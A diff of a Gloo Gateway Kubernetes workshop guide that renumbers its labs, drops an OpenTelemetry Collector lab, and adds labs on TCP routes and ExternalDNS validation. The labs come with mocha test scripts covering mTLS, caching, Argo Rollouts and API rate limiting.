-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/mtls.test.js.liquid from lab number 15"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/mtls.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 -->
 
 We've now enforced mutual TLS at the gateway, such that all clients accessing the httpbin service must present a valid certificate signed by the client CA trusted by the gateway.
@@ -3734,8 +4922,8 @@ describe("Client certificate forwarding", () => {
 })
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/x-forwarded-client-cert.test.js.liquid from lab number 15"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/x-forwarded-client-cert.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 -->
 
 With the `Subject` of the client certificate now available in the `X-Forwarded-Client-Cert` header, the team in charge of the httpbin application can use an OPA rule to check that the Common Name (`CN`) in the `Subject` is in a list of permitted clients:
@@ -3892,8 +5080,8 @@ describe("Authorization based on Common Name", () => {
 })
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/authorization.test.js.liquid from lab number 15"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/authorization.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 -->
 
 Now, the team in charge of the gateway has enforced mutual authentication that validates that client certificates were signed by a trusted CA, and the httpbin team has extended it with an authorization policy using OPA that checks the client certificate's Common Name and allows requests only if the Common Name is in a preconfigured list of clients.
@@ -3940,7 +5128,7 @@ kubectl --context ${CLUSTER1} -n httpbin delete RouteOption routeoption
 
 
 
-## Lab 16 - Use the `cache-control` response header to cache responses <a name="lab-16---use-the-`cache-control`-response-header-to-cache-responses-"></a>
+## Lab 21 - Use the `cache-control` response header to cache responses <a name="lab-21---use-the-`cache-control`-response-header-to-cache-responses-"></a>
 
 An HTTP or HTTPS listener on your gateway can be configured to cache responses for upstream services.
 When the listener routes a request to an upstream service, the response from the upstream is automatically cached by the caching server if it contains a `cache-control` response header.
@@ -4045,8 +5233,8 @@ describe("response caching", function() {
 })
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-doesnt-apply.test.js.liquid from lab number 16"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-doesnt-apply.test.js.liquid from lab number 21"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
 -->
 
 In this example we'll configure caching on all routes processed by the `Gateway` that we have already set up.
@@ -4179,8 +5367,8 @@ describe("response caching", function() {
 })
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-applies.test.js.liquid from lab number 16"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=200 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-applies.test.js.liquid from lab number 21"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=200 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
 -->
 
 Notice that the first two responses have the same `date` header showing that the response for the first request was also returned as the response for the second request.
@@ -4197,7 +5385,7 @@ kubectl --context ${CLUSTER1} -n gloo-system delete httplisteneroption cache
 
 
 
-## Lab 17 - Deploy Argo Rollouts <a name="lab-17---deploy-argo-rollouts-"></a>
+## Lab 22 - Deploy Argo Rollouts <a name="lab-22---deploy-argo-rollouts-"></a>
 
 [Argo Rollouts](https://argoproj.github.io/rollouts/) is a declarative progressive delivery tool for Kubernetes that we can use to update applications gradually, using a blue/green or canary strategy to manage the rollout.
 
@@ -4232,7 +5420,7 @@ Now we're ready to use Argo Rollouts to progressively update applications as par
 
 
 
-## Lab 18 - Roll out a new app version using Argo Rollouts <a name="lab-18---roll-out-a-new-app-version-using-argo-rollouts-"></a>
+## Lab 23 - Roll out a new app version using Argo Rollouts <a name="lab-23---roll-out-a-new-app-version-using-argo-rollouts-"></a>
 
 We're going to use Argo Rollouts to gradually deliver an upgraded version of our httpbin application.
 To do this, we'll define a resource that lets Argo Rollouts know how we want it to handle updates to our application,
@@ -4566,8 +5754,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 <!--bash
 cat <<'EOF' > ./test.js
@@ -4603,8 +5791,8 @@ describe("httproute weights for rollout canary weight 0", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 
 Now, let's trigger the rollout by updating the image of the `httpbin` container to the latest version:
@@ -4684,8 +5872,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 <!--bash
 cat <<'EOF' > ./test.js
@@ -4721,8 +5909,8 @@ describe("httproute weights for rollout canary weight 0", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 
 Let's get it to the next step by running this command:
@@ -4847,8 +6035,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 <!--bash
 cat <<'EOF' > ./test.js
@@ -4884,8 +6072,8 @@ describe("httproute weights for rollout canary weight 50", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 
 Let's proceed to the last step of the rollout by promoting the rollout in the dashboard or running this command:
@@ -4954,8 +6142,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 <!--bash
 cat <<'EOF' > ./test.js
@@ -4991,8 +6179,8 @@ describe("httproute weights for rollout canary weight 100", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 
 One final promotion of the rollout will get us back to the completed state, where we have a single pod running the new image; all traffic is being routed to it through the stable service; and both the stable and canary services will be selecting the new pod.
@@ -5079,8 +6267,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout-final.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout-final.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 <!--bash
 cat <<'EOF' > ./test.js
@@ -5116,8 +6304,8 @@ describe("httproute weights for rollout canary weight 0", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 -->
 You can clean up by deleting the `Rollout` and canary service:
 
@@ -5201,206 +6389,95 @@ EOF
 
 
 
-## Lab 19 - Deploy OpenTelemetry Collector <a name="lab-19---deploy-opentelemetry-collector-"></a>
+## Lab 24 - Expose a service through TCP <a name="lab-24---expose-a-service-through-tcp-"></a>
 
-Having metrics is essential for running applications reliably, and gateways are no exceptions.
+Gloo Gateway allows you to expose TCP services using `TCPRoutes`.
 
-Using [OpenTelemetry Collectors](https://github.com/open-telemetry/opentelemetry-collector-contrib) is a nice way to collect, transform, and ship telemetry to your observability backends.
-
-Let's deploy the OSS distribution of OpenTelemetry Collector, and get started!
+Let's create a `Gateway` object to create a proxy which is going to listen to incoming requests on port 8080:
 
 ```bash
-helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
-helm repo update
-
-helm upgrade --install opentelemetry-collector open-telemetry/opentelemetry-collector \
---version 0.97.1 \
---set mode=deployment \
---set image.repository="otel/opentelemetry-collector-contrib" \
---set command.name="otelcol-contrib" \
---namespace=otel \
---create-namespace \
--f -<<EOF
-clusterRole:
-  create: true
-  rules:
-  - apiGroups:
-    - ''
-    resources:
-    - 'pods'
-    - 'nodes'
-    verbs:
-    - 'get'
-    - 'list'
-    - 'watch'
-ports:
-  promexporter:
-    enabled: true
-    containerPort: 9099
-    servicePort: 9099
-    protocol: TCP
-config:
-  receivers:
-    prometheus/gloo-dataplane:
-      config:
-        scrape_configs:
-        # Scrape the Gloo Gateway pods
-        - job_name: gloo-gateways
-          honor_labels: true
-          kubernetes_sd_configs:
-          - role: pod
-          relabel_configs:
-            - action: keep
-              regex: kube-gateway
-              source_labels:
-              - __meta_kubernetes_pod_label_gloo
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
-              action: keep
-              regex: true
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
-              action: replace
-              target_label: __metrics_path__
-              regex: (.+)
-            - action: replace
-              source_labels:
-              - __meta_kubernetes_pod_ip
-              - __meta_kubernetes_pod_annotation_prometheus_io_port
-              separator: ':'
-              target_label: __address__
-            - action: labelmap
-              regex: __meta_kubernetes_pod_label_(.+)
-            - source_labels: [__meta_kubernetes_namespace]
-              action: replace
-              target_label: kube_namespace
-            - source_labels: [__meta_kubernetes_pod_name]
-              action: replace
-              target_label: pod
-    prometheus/gloo-controlplane:
-      config:
-        scrape_configs:
-        # Scrape the Gloo pods
-        - job_name: gloo-gateways
-          honor_labels: true
-          kubernetes_sd_configs:
-          - role: pod
-          relabel_configs:
-            - action: keep
-              regex: gloo
-              source_labels:
-              - __meta_kubernetes_pod_label_gloo
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
-              action: keep
-              regex: true
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
-              action: replace
-              target_label: __metrics_path__
-              regex: (.+)
-            - action: replace
-              source_labels:
-              - __meta_kubernetes_pod_ip
-              - __meta_kubernetes_pod_annotation_prometheus_io_port
-              separator: ':'
-              target_label: __address__
-            - action: labelmap
-              regex: __meta_kubernetes_pod_label_(.+)
-            - source_labels: [__meta_kubernetes_namespace]
-              action: replace
-              target_label: kube_namespace
-            - source_labels: [__meta_kubernetes_pod_name]
-              action: replace
-              target_label: pod
-  exporters:
-    prometheus:
-      endpoint: 0.0.0.0:9099
-    debug: {}
-  service:
-    pipelines:
-      metrics:
-        receivers: [prometheus/gloo-dataplane, prometheus/gloo-controlplane]
-        processors: [batch]
-        exporters: [prometheus]
-EOF
-```
-
-This deployment will now scrape our Gateways' metrics, and expose these metrics in Prometheus format.
-
-While you could scrape the Gateway pods directly as well, that might only work if you only want to consume them from the local cluster. Or, you could be standardizing on OpenTelemetry to avoid vendor/project specific agents. In this case, ingesting the metrics into an OTel Collector can make perfect sense, since you can freely transform telemetry data and ship to the backend of your liking.
-
-For simplicity's sake, let's imagine that our desired backend is a local Prometheus instance. Let's get the telemetry data in to that one!
-
-First, let's install kube-prometheus-stack!
-
-```bash
-helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
-helm repo update
-
-helm upgrade --install kube-prometheus-stack \
-prometheus-community/kube-prometheus-stack \
---version 61.2.0 \
---namespace monitoring \
---create-namespace \
---values - <<EOF
-grafana:
-  service:
-    type: LoadBalancer
-    port: 3000
-prometheus:
-  prometheusSpec:
-    ruleSelectorNilUsesHelmValues: false
-    serviceMonitorSelectorNilUsesHelmValues: false
-    podMonitorSelectorNilUsesHelmValues: false
-EOF
-```
-
-Finally, configure scraping for our OTel Collector via a PodMonitor!
-
-```bash
-cat <<EOF | kubectl apply -n otel -f -
-apiVersion: monitoring.coreos.com/v1
-kind: PodMonitor
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: Gateway
 metadata:
-  name: otel-monitor
+  name: tcp
+  namespace: gloo-system
 spec:
-  podMetricsEndpoints:
-  - interval: 30s
-    port: promexporter
-    scheme: http
-  selector:
-    matchLabels:
-      app.kubernetes.io/name: opentelemetry-collector
+  gatewayClassName: gloo-gateway
+  listeners:
+  - name: httpbin
+    protocol: TCP
+    port: 8080
+    allowedRoutes:
+      kinds:
+      - kind: TCPRoute
 EOF
 ```
 
-Now let's import a sample dashboard!
+Then, you can create a `TCPRoute` to expose the `httpbin1` service through the gateway.
 
 ```bash
-kubectl -n monitoring create cm envoy-dashboard \
---from-file=data/steps/deploy-otel-collector/envoy.json
-kubectl label -n monitoring cm envoy-dashboard grafana_dashboard=1
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1alpha2
+kind: TCPRoute
+metadata:
+  name: tcp-httpbin
+  namespace: gloo-system
+spec:
+  parentRefs:
+  - name: tcp
+    sectionName: httpbin
+  rules:
+  - backendRefs:
+    - name: httpbin1
+      namespace: httpbin
+      port: 8000
+EOF
 ```
 
-Let's generate some traffic!
+Note that `httpbin1` is an HTTP service, so it would normally be exposed through an `HTTPRoute` and someone would normally use `TCPRoutes` to expose services like databases.
 
-```bash,norun-workshop
-for i in {1..5}; do curl https://httpbin.example.com/get -v; done
-```
-
-
-To access Grafana, you need to get the endpoint using the following command:
+Finally, you need to create a `ReferenceGrant` to allow the gateway in the `gloo-system` namespace to send traffic to the `httpbin1` service in the `httpbin` namespace.
 
 ```bash
-echo "http://$(kubectl --context ${CLUSTER1} -n monitoring get svc kube-prometheus-stack-grafana -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}'):3000"
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1beta1
+kind: ReferenceGrant
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  from:
+  - group: gateway.networking.k8s.io
+    kind: TCPRoute
+    namespace: gloo-system
+  to:
+  - group: ""
+    kind: Service
+EOF
 ```
 
+Set the environment variable for the service corresponding to the gateway:
 
-Login with `admin` and `prom-operator` you should be able to see how traffic flows trough your Gateways!
+```bash
+export TCP_PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-tcp -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
+```
 
-![Envoy dashboard](images/steps/deploy-otel-collector/envoy.png)
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through TCP", () => {
+  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `http://${process.env.TCP_PROXY_IP}:8080`, path: '/get', body: 'headers', match: true }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/tcp-route/tests/tcp.test.js.liquid from lab number 24"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+-->
 
 
 
-
-## Lab 20 - Deploy the Bookinfo sample application <a name="lab-20---deploy-the-bookinfo-sample-application-"></a>
+## Lab 25 - Deploy the Bookinfo sample application <a name="lab-25---deploy-the-bookinfo-sample-application-"></a>
 [<img src="https://img.youtube.com/vi/nzYcrjalY5A/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/nzYcrjalY5A "Video Link")
 
 We're going to deploy the Bookinfo sample application to demonstrate several features of Gloo Gateway.
@@ -5432,8 +6509,8 @@ describe("Bookinfo app", () => {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid from lab number 20"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid from lab number 25"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
 -->
 Configure your hosts file to resolve bookinfo.example.com with the IP address of the proxy by executing the following command:
 
@@ -5443,7 +6520,7 @@ Configure your hosts file to resolve bookinfo.example.com with the IP address of
 
 
 
-## Lab 21 - Expose the productpage API securely <a name="lab-21---expose-the-productpage-api-securely-"></a>
+## Lab 26 - Expose the productpage API securely <a name="lab-26---expose-the-productpage-api-securely-"></a>
 
 Gloo Gateway includes a developer portal, which provides a framework for managing API discovery, API client identity, and API policies.
 
@@ -5531,8 +6608,8 @@ describe("Access the API without authentication", () => {
   it('Checking text \'The Comedy of Errors\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', body: 'The Comedy of Errors', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid from lab number 21"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid from lab number 26"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 -->
 
 
@@ -5615,8 +6692,8 @@ describe("Access to API unauthorized", () => {
   it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid from lab number 21"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid from lab number 26"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 -->
 
 The access is refused (403 response):
@@ -5659,8 +6736,8 @@ describe("Access to API authorized", () => {
   it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 200 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid from lab number 21"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid from lab number 26"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 -->
 
 So, we've secured the access to our API, but you generally want to also limit the usage of your API.
@@ -5765,8 +6842,8 @@ describe("Access to API rate limited", () => {
   it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 429 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-rate-limited.test.js.liquid from lab number 21"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-rate-limited.test.js.liquid from lab number 26"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 -->
 
 Next, let's tell Gloo about this API. Annotate the Bookinfo's `productpage` Service with information about it's OpenAPI schema. This allows Gloo to discover this APIs schema:
@@ -5801,8 +6878,8 @@ describe("APIDoc has been created", () => {
     it('APIDoc is present', () => helpers.k8sObjectIsPresent({ context: process.env.CLUSTER1, namespace: "bookinfo", k8sType: "apidoc", k8sObj: "productpage-service" }));
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/apidoc-created.test.js.liquid from lab number 21"
-timeout --signal=INT 5m mocha ./test.js --timeout 10000 --retries=300 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/apidoc-created.test.js.liquid from lab number 26"
+timeout --signal=INT 5m mocha ./test.js --timeout 10000 --retries=300 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 -->
 
 You should get something like this:
@@ -5986,10 +7063,44 @@ spec:
       - ".*"
 EOF
 ```
+<!--bash
+PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
+-->
+Since we've deployed ExternalDNS, let us validate that the DNS entry was successfully created in the DNS server. You should get an IP Address as response.
+```bash,norun-workshop
+dig +short @${BIND_CONTAINER_IP} bookinfo.example.com
+```
+<!--bash
+cat <<'EOF' > ./test.js
+const dns = require('dns');
+const chaiHttp = require("chai-http");
+const chai = require("chai");
+const expect = chai.expect;
+chai.use(chaiHttp);
+const { waitOnFailedTest } = require('./tests/utils');
+
+afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
+
+describe("ExternalDNS dns entry validation", () => {
+    it('bookinfo.example.com resolves to ' + process.env.PROXY_IP + ' by the local test DNS server ' + process.env.BIND_CONTAINER_IP, (done) => {
+        dns.setServers([ process.env.BIND_CONTAINER_IP ]);
+        return dns.resolve('bookinfo.example.com', (error, address) => {
+            if (!error) {
+                expect(address.toString()).to.be.eq(process.env.PROXY_IP);
+            }
+            done(error);
+        });
+    });
+});
+
+EOF
+echo "executing test ./default/tests/external-dns.test.js.liquid from lab number 26"
